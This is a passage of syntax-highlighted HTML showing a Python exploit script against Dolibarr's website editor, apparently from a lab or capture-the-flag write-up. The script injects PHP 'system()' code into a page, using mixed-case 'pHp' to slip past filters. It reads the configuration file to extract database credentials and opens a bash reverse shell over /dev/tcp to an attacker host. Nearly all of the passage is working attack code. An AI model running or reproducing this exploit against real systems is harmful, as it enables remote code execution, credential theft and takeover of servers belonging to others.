+<span class="giallo-l"><span class="z-3 z-i">        for</span><span> option_tag</span><span class="z-3 z-i"> in</span><span> page_selector</span><span class="z-3">.</span><span class="z-2">find_all</span><span class="z-3">(</span><span class=" z-i">name</span><span class="z-3">=&quot;</span><span class="z-6">option</span><span class="z-3">&quot;):</span></span>
+<span class="giallo-l"><span class="z-3 z-i">            if</span><span> option_tag</span><span class="z-3"> is not None and</span><span class="z-2"> isinstance</span><span class="z-3">(</span><span class="z-2">option_tag</span><span class="z-3">,</span><span class="z-2"> Tag</span><span class="z-3">):</span></span>
+<span class="giallo-l"><span class="z-3 z-i">                if</span><span> pattern</span><span class="z-3">.</span><span class="z-2">search</span><span class="z-3">(</span><span class="z-2">option_tag</span><span class="z-3">.</span><span class="z-9">text</span><span class="z-3">) is not None:</span></span>
+<span class="giallo-l"><span>                    pageid_str</span><span class="z-3"> =</span><span> option_tag</span><span class="z-3">.</span><span class="z-2">get</span><span class="z-3">(&quot;</span><span class="z-6">value</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">                    if</span><span class="z-3"> (</span></span>
+<span class="giallo-l"><span>                        pageid_str</span><span class="z-3"> is not None</span></span>
+<span class="giallo-l"><span class="z-3">                        and</span><span class="z-2"> isinstance</span><span class="z-3">(</span><span class="z-2">pageid_str</span><span class="z-3">,</span><span class="z-12"> str</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3">                        and</span><span> pageid_str</span><span class="z-3">.</span><span class="z-2">isdigit</span><span class="z-3">()</span></span>
+<span class="giallo-l"><span class="z-3">                    ):</span></span>
+<span class="giallo-l"><span class="z-3 z-i">                        return</span><span class="z-12"> int</span><span class="z-3">(</span><span class="z-2">pageid_str</span><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">    return</span><span class="z-3"> None</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-7">async def</span><span class="z-2"> create_page</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class=" z-i">    session</span><span class="z-3">:</span><span> aiohttp</span><span class="z-3">.</span><span class="z-9">ClientSession</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    url</span><span class="z-3">:</span><span> URL</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    csrf_token</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    site_name</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    page_name</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-3">) -&gt;</span><span> Optional</span><span class="z-3">[</span><span class="z-12">int</span><span class="z-3">]:</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3"> =</span><span> aiohttp</span><span class="z-3">.</span><span class="z-2">FormData</span><span class="z-3">()</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">token</span><span class="z-3">&quot;,</span><span class="z-2"> csrf_token</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">backtopage</span><span class="z-3">&quot;, &quot;&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">dol_openinpopup</span><span class="z-3">&quot;, &quot;&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">action</span><span class="z-3">&quot;, &quot;</span><span class="z-6">addcontainer</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">website</span><span class="z-3">&quot;,</span><span class="z-2"> site_name</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">pageidbis</span><span class="z-3">&quot;, &quot;</span><span class="z-6">-1</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">pageid</span><span class="z-3">&quot;, &quot;&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">radiocreatefrom</span><span class="z-3">&quot;, &quot;</span><span class="z-6">checkboxcreatemanually</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">WEBSITE_TYPE_CONTAINER</span><span class="z-3">&quot;, &quot;</span><span class="z-6">page</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">sample</span><span class="z-3">&quot;, &quot;</span><span class="z-6">empty</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">WEBSITE_TITLE</span><span class="z-3">&quot;, &quot;</span><span class="z-6">EXPLOIT</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">WEBSITE_PAGENAME</span><span class="z-3">&quot;,</span><span class="z-2"> page_name</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">WEBSITE_ALIASALT</span><span class="z-3">&quot;, &quot;&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">WEBSITE_DESCRIPTION</span><span class="z-3">&quot;, &quot;&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">WEBSITE_IMAGE</span><span class="z-3">&quot;, &quot;&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">WEBSITE_KEYWORDS</span><span class="z-3">&quot;, &quot;&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">WEBSITE_LANG</span><span class="z-3">&quot;, &quot;</span><span class="z-6">en</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">WEBSITE_AUTHORALIAS</span><span class="z-3">&quot;, &quot;&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">datecreation</span><span class="z-3">&quot;, &quot;</span><span class="z-6">08/21/2025</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">datecreationday</span><span class="z-3">&quot;, &quot;</span><span class="z-6">21</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">datecreationmonth</span><span class="z-3">&quot;, &quot;</span><span class="z-6">08</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">datecreationyear</span><span class="z-3">&quot;, &quot;</span><span class="z-6">2025</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">datecreationhour</span><span class="z-3">&quot;, &quot;</span><span class="z-6">20</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">datecreationmin</span><span class="z-3">&quot;, &quot;</span><span class="z-6">00</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">datecreationsec</span><span class="z-3">&quot;, &quot;</span><span class="z-6">00</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">htmlheader_x</span><span class="z-3">&quot;, &quot;&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">htmlheader_y</span><span class="z-3">&quot;, &quot;&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">htmlheader</span><span class="z-3">&quot;, &quot;&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">addcontainer</span><span class="z-3">&quot;, &quot;</span><span class="z-6">Create</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">externalurl</span><span class="z-3">&quot;, &quot;&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">grabimages</span><span class="z-3">&quot;, &quot;</span><span class="z-6">1</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">grabimagesinto</span><span class="z-3">&quot;, &quot;</span><span class="z-6">root</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>    resp</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> session</span><span class="z-3">.</span><span class="z-2">post</span><span class="z-3">(</span><span class="z-2">url</span><span class="z-3">,</span><span class=" z-i"> data</span><span class="z-3">=</span><span class="z-2">data</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    if</span><span> resp</span><span class="z-3">.</span><span class="z-9">status</span><span class="z-3"> !=</span><span class="z-10"> 200</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        return</span><span class="z-3"> None</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">    return await</span><span class="z-2"> get_pageid</span><span class="z-3">(</span><span class="z-3 z-i">await</span><span class="z-2"> resp</span><span class="z-3">.</span><span class="z-2">text</span><span class="z-3">(),</span><span class="z-2"> page_name</span><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-7">async def</span><span class="z-2"> edit_page</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class=" z-i">    session</span><span class="z-3">:</span><span> aiohttp</span><span class="z-3">.</span><span class="z-9">ClientSession</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    url</span><span class="z-3">:</span><span> URL</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    csrf_token</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    site_name</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    pageid</span><span class="z-3">:</span><span class="z-12"> int</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    cmd</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-3">) -&gt;</span><span class="z-12"> bool</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-1 z-i">    #</span><span class="z-3 z-i"> NOTE</span><span class="z-1 z-i">: &quot;pHp&quot; is used instead of &quot;php&quot; to bypass simple filters.</span></span>
+<span class="giallo-l"><span>    page_content</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3"> = (</span></span>
+<span class="giallo-l"><span class="z-7">        f</span><span class="z-6">&quot;&quot;&quot;</span></span>
+<span class="giallo-l"><span class="z-6">&lt;section id=&quot;exploit-section&quot; contenteditable=&quot;true&quot;&gt;</span></span>
+<span class="giallo-l"><span class="z-6">    &lt;?pHp system(&quot;</span><span class="z-10">{</span><span>cmd</span><span class="z-10">}</span><span class="z-6">&quot;)?&gt;</span></span>
+<span class="giallo-l"><span class="z-6">&lt;/section&gt;</span></span>
+<span class="giallo-l"><span class="z-6">&quot;&quot;&quot;</span><span class="z-3">.</span><span class="z-2">strip</span><span class="z-3">()</span></span>
+<span class="giallo-l"><span class="z-3">    )</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>    data</span><span class="z-3"> =</span><span> aiohttp</span><span class="z-3">.</span><span class="z-2">FormData</span><span class="z-3">()</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">token</span><span class="z-3">&quot;,</span><span class="z-2"> csrf_token</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">backtopage</span><span class="z-3">&quot;, &quot;&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">dol_openinpopup</span><span class="z-3">&quot;, &quot;&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">action</span><span class="z-3">&quot;, &quot;</span><span class="z-6">updatesource</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">website</span><span class="z-3">&quot;,</span><span class="z-2"> site_name</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">pageid</span><span class="z-3">&quot;,</span><span class="z-12"> str</span><span class="z-3">(</span><span class="z-2">pageid</span><span class="z-3">))</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">update</span><span class="z-3">&quot;, &quot;</span><span class="z-6">Save</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">PAGE_CONTENT_x</span><span class="z-3">&quot;, &quot;</span><span class="z-6">8</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">PAGE_CONTENT_y</span><span class="z-3">&quot;, &quot;</span><span class="z-6">2</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">PAGE_CONTENT</span><span class="z-3">&quot;,</span><span class="z-2"> page_content</span><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>    resp</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> session</span><span class="z-3">.</span><span class="z-2">post</span><span class="z-3">(</span><span class="z-2">url</span><span class="z-3">,</span><span class=" z-i"> data</span><span class="z-3">=</span><span class="z-2">data</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    return</span><span> resp</span><span class="z-3">.</span><span class="z-9">status</span><span class="z-3"> ==</span><span class="z-10"> 200</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-7">async def</span><span class="z-2"> get_output</span><span class="z-3">(</span><span class=" z-i">html_content</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">) -&gt;</span><span class="z-12"> str</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span>    soup</span><span class="z-3"> =</span><span class="z-2"> BeautifulSoup</span><span class="z-3">(</span><span class="z-2">html_content</span><span class="z-3">, &quot;</span><span class="z-6">html.parser</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    exploit_section</span><span class="z-3"> =</span><span> soup</span><span class="z-3">.</span><span class="z-2">find</span><span class="z-3">(&quot;</span><span class="z-6">section</span><span class="z-3">&quot;,</span><span class=" z-i"> attrs</span><span class="z-3">={&quot;</span><span class="z-6">id</span><span class="z-3">&quot;: &quot;</span><span class="z-6">exploit-section</span><span class="z-3">&quot;})</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">    if</span><span> exploit_section</span><span class="z-3"> is not None and</span><span class="z-2"> isinstance</span><span class="z-3">(</span><span class="z-2">exploit_section</span><span class="z-3">,</span><span class="z-2"> Tag</span><span class="z-3">):</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        return</span><span class="z-12"> str</span><span class="z-3">(</span><span class="z-2">exploit_section</span><span class="z-3">).</span><span class="z-2">strip</span><span class="z-3">()</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">    return</span><span class="z-3"> &quot;&quot;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-7">async def</span><span class="z-2"> run_cmd</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class=" z-i">    session</span><span class="z-3">:</span><span> aiohttp</span><span class="z-3">.</span><span class="z-9">ClientSession</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    url</span><span class="z-3">:</span><span> URL</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    csrf_token</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    site_name</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    page_name</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    pageid</span><span class="z-3">:</span><span class="z-12"> int</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    cmd</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-3">) -&gt;</span><span> Optional</span><span class="z-3">[</span><span class="z-12">str</span><span class="z-3">]:</span></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Edit the page to inject the command</span></span>
+<span class="giallo-l"><span>    is_page_edited</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span class="z-2"> edit_page</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-2">        session</span><span class="z-3">,</span><span class="z-2"> url</span><span class="z-3">,</span><span class="z-2"> csrf_token</span><span class="z-3">,</span><span class="z-2"> site_name</span><span class="z-3">,</span><span class="z-2"> pageid</span><span class="z-3">,</span><span class="z-2"> cmd</span></span>
+<span class="giallo-l"><span class="z-3">    )</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    if</span><span class="z-3"> not</span><span> is_page_edited</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        raise</span><span class="z-12"> ValueError</span><span class="z-3">(&quot;</span><span class="z-6">Failed to edit the exploit page.</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(&quot;</span><span class="z-6">Exploit page edited successfully.</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Access the exploit page</span></span>
+<span class="giallo-l"><span>    url</span><span class="z-3"> =</span><span> EXPLOIT_PAGE_URL</span><span class="z-3"> % {</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">website</span><span class="z-3">&quot;:</span><span> site_name</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">pageref</span><span class="z-3">&quot;:</span><span> page_name</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-3">    }</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    async with</span><span> session</span><span class="z-3">.</span><span class="z-2">get</span><span class="z-3">(</span><span class="z-2">url</span><span class="z-3">)</span><span class="z-3 z-i"> as</span><span> resp</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        if</span><span> resp</span><span class="z-3">.</span><span class="z-9">status</span><span class="z-3"> !=</span><span class="z-10"> 200</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-2">            print</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;Failed to access exploit page: </span><span class="z-10">{</span><span class="z-2">resp</span><span class="z-3">.</span><span class="z-9">status</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">            return</span><span class="z-3"> None</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">(&quot;</span><span class="z-6">Exploit page accessed successfully.</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>        response_text</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> resp</span><span class="z-3">.</span><span class="z-2">text</span><span class="z-3">()</span></span>
+<span class="giallo-l"><span>        output</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span class="z-2"> get_output</span><span class="z-3">(</span><span class="z-2">response_text</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        return</span><span> output</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>CONF_PATTERN</span><span class="z-3"> =</span><span> re</span><span class="z-3">.</span><span class="z-2">compile</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-7">    r</span><span class="z-3">&quot;</span><span>\$</span><span class="z-6">dolibarr_main_db_user=&#39;</span><span class="z-3">(</span><span class="z-9">?P&lt;username&gt;</span><span class="z-6">.</span><span class="z-3">*)</span><span class="z-6">&#39;;</span><span>\n\$</span><span class="z-6">dolibarr_main_db_pass=&#39;</span><span class="z-3">(</span><span class="z-9">?P&lt;password&gt;</span><span class="z-6">.</span><span class="z-3">*)</span><span class="z-6">&#39;;</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-7">async def</span><span class="z-2"> access_conf_file</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class=" z-i">    session</span><span class="z-3">:</span><span> aiohttp</span><span class="z-3">.</span><span class="z-9">ClientSession</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    url</span><span class="z-3">:</span><span> URL</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    csrf_token</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    site_name</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    page_name</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    pageid</span><span class="z-3">:</span><span class="z-12"> int</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-3">):</span></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Edit the page to read the configuration file</span></span>
+<span class="giallo-l"><span>    cmd</span><span class="z-3"> =</span><span class="z-7"> f</span><span class="z-6">&quot;id &amp;&amp; pwd &amp;&amp; cat </span><span class="z-10">{</span><span>CONF_FILE_PATH</span><span class="z-10">}</span><span class="z-6">&quot;</span></span>
+<span class="giallo-l"><span>    output</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span class="z-2"> run_cmd</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-2">        session</span><span class="z-3">,</span><span class="z-2"> url</span><span class="z-3">,</span><span class="z-2"> csrf_token</span><span class="z-3">,</span><span class="z-2"> site_name</span><span class="z-3">,</span><span class="z-2"> page_name</span><span class="z-3">,</span><span class="z-2"> pageid</span><span class="z-3">,</span><span class="z-2"> cmd</span></span>
+<span class="giallo-l"><span class="z-3">    )</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    if</span><span> output</span><span class="z-3"> is not None:</span></span>
+<span class="giallo-l"><span>        match</span><span class="z-3"> =</span><span> CONF_PATTERN</span><span class="z-3">.</span><span class="z-2">search</span><span class="z-3">(</span><span class="z-2">output</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        if</span><span> match</span><span class="z-3"> is not None:</span></span>
+<span class="giallo-l"><span>            username</span><span class="z-3"> =</span><span> match</span><span class="z-3">.</span><span class="z-2">group</span><span class="z-3">(&quot;</span><span class="z-6">username</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span class="z-2">            print</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;Username: </span><span class="z-10">{</span><span class="z-2">username</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span>            password</span><span class="z-3"> =</span><span> match</span><span class="z-3">.</span><span class="z-2">group</span><span class="z-3">(&quot;</span><span class="z-6">password</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span class="z-2">            print</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;Password: </span><span class="z-10">{</span><span class="z-2">password</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span>            credentials</span><span class="z-3">[&quot;</span><span class="z-6">larissa</span><span class="z-3">&quot;] =</span><span> password</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        else</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-2">            print</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;</span><span class="z-10">{</span><span class="z-2">output</span><span class="z-7">=</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-7">async def</span><span class="z-2"> create_reverse_shell</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class=" z-i">    session</span><span class="z-3">:</span><span> aiohttp</span><span class="z-3">.</span><span class="z-9">ClientSession</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    url</span><span class="z-3">:</span><span> URL</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    csrf_token</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    site_name</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    page_name</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    pageid</span><span class="z-3">:</span><span class="z-12"> int</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    lhost</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    lport</span><span class="z-3">:</span><span class="z-12"> int</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-3">):</span></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Edit the page to create a reverse shell</span></span>
+<span class="giallo-l"><span>    cmd</span><span class="z-3"> =</span><span class="z-7"> f</span><span class="z-6">&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/</span><span class="z-10">{</span><span>lhost</span><span class="z-10">}</span><span class="z-6">/</span><span class="z-10">{</span><span>lport</span><span class="z-10">}</span><span class="z-6"> 0&gt;&amp;1&#39;&quot;</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    await</span><span class="z-2"> run_cmd</span><span class="z-3">(</span><span class="z-2">session</span><span class="z-3">,</span><span class="z-2"> url</span><span class="z-3">,</span><span class="z-2"> csrf_token</span><span class="z-3">,</span><span class="z-2"> site_name</span><span class="z-3">,</span><span class="z-2"> page_name</span><span class="z-3">,</span><span class="z-2"> pageid</span><span class="z-3">,</span><span class="z-2"> cmd</span><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-7">async def</span><span class="z-2"> exploit</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class=" z-i">    lhost</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    lport</span><span class="z-3">:</span><span class="z-12"> int</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-3">):</span></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Append datetime to the site name to avoid conflicts</span></span>
